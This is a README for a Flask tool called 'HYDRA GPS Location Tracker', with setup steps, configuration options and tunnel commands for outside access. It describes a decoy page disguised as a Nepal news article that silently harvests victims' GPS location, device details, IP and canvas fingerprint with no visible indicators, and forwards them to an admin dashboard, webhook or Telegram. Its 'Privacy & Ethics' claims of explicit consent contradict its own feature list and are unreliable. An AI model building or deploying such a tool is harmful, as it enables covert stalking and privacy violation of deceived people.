
<p align="center">
  <img src="https://upload.wikimedia.org/wikipedia/en/thumb/9/9b/Hydra_symbol.png/200px-Hydra_symbol.png" 
       alt="Hydra Logo" width="150" />
</p>

<h1 align="center" style="color:red;">🟥 HYDRA GPS Location Tracker 🟥</h1>
<p align="center">
  <b>Real-time location and device tracking system with admin dashboard — for <i>educational purposes only</i>.</b>
</p># GPS Location Tracker

Real-time location and device tracking system with admin dashboard for educational purposes.

## 🚀 Quick Start

### Automated Setup (Recommended)

**Linux/macOS:**
```bash
# Make script executable and run
chmod +x scripts/setup_and_run.sh
./scripts/setup_and_run.sh
```

**Windows:**
```cmd
# Run the batch script
scripts\setup_and_run.bat
```

### Manual Setup

1. **Create virtual environment:**
```bash
# Linux/macOS
python3 -m venv .venv
source .venv/bin/activate

# Windows
python -m venv .venv
.venv\Scripts\activate
```

2. **Install dependencies:**
```bash
pip install -r requirements.txt

# For development
pip install -r requirements-dev.txt
```

3. **Configure environment (optional):**
```bash
# Copy and edit .env file
cp .env.example .env
# Edit .env file with your preferred settings
```

4. **Run the application:**
```bash
python app.py
```

## 📋 Requirements

### Core Dependencies
- **Flask 2.3.3** - Web framework
- **user-agents 2.2.0** - User agent parsing
- **requests 2.31.0** - HTTP requests for webhooks
- **Werkzeug 2.3.7** - WSGI utilities
- **Jinja2 3.1.2** - Template engine

### Additional Features
- **Flask-CORS** - Cross-origin resource sharing
- **python-dotenv** - Environment variable management
- **gunicorn** - Production WSGI server
- **cryptography** - Security features

### Development Tools (optional)
- **pytest** - Testing framework
- **flake8, black, isort** - Code quality tools
- **mypy** - Type checking
- **bandit, safety** - Security scanning

## Project Structure

```
gps_tracker_auto/
├── app.py               # Main Flask application
├── config/
│   └── __init__.py     # Configuration settings
├── static/
│   ├── css/
│   │   └── styles.css  # Global styles
│   └── js/
│       └── capture.js  # Location tracking script
├── templates/
│   ├── admin/
│   │   ├── dashboard.html  # Admin tracking dashboard
│   │   └── login.html     # Admin login page
│   ├── default/
│   │   └── index.html     # Target-facing page
│   └── base.html      # Base template
└── utils/
    ├── ua.py          # User agent parsing
    └── webhook.py     # Webhook handlers

## Features

1. Target Page (http://localhost:5000/)
- Appears as a news article about corruption in Nepal
- Silently collects location and device data
- No visible tracking indicators

2. Admin Dashboard (http://localhost:5000/admin_893b4de8f1)
- Password protected (default: admin123)
- Real-time location tracking on map
- Device info and event logging
- Auto-refresh capability

3. Data Collection
- GPS coordinates with accuracy
- Device hardware info
- Browser details
- IP address
- Canvas fingerprint

## Configuration

Environment variables or CLI arguments:

- `PORT` / `--port`: Server port (default: 5000)
- `TEMPLATE` / `--template`: Template to use (default: default)
- `DEBUG_HTTP` / `--debug-http`: Disable HTTPS enforcement
- `WEBHOOK` / `--webhook`: Webhook URL for events
- `TELEGRAM` / `--telegram`: Telegram bot token:chat_id
- `KML_OUTPUT` / `--kml`: KML export file path

Template customization:
- `TITLE`: Page title
- `DESC`: Meta description
- `IMAGE`: OG image URL
- `SITENAME`: Site name
- `DISPLAY_URL`: Display URL

## Templates

### Default Template
Basic location service gate with permission prompt.

### News Template
Article-style layout with location requirement for "full access".

## Adding Custom Templates

1. Create a new folder in `templates/`
2. Add `index.html` extending `base.html`
3. Include capture.js and implement location trigger
4. Select via `--template` or `TEMPLATE` env var

## External Access

For testing with external devices, use a tunnel service:

```bash
# Using ngrok
ngrok http 5000

# Using localtunnel
lt --port 5000

# Using serveo
ssh -R 80:localhost:5000 serveo.net
```

## Privacy & Ethics

- Only collects location with explicit user consent
- Uses standard browser permission prompts
- No bypass attempts or dark patterns
- Clear educational purpose disclosure
- Data stored in-memory only
- No persistent storage

## License

This project is licensed under the MIT License - see the LICENSE file for details.

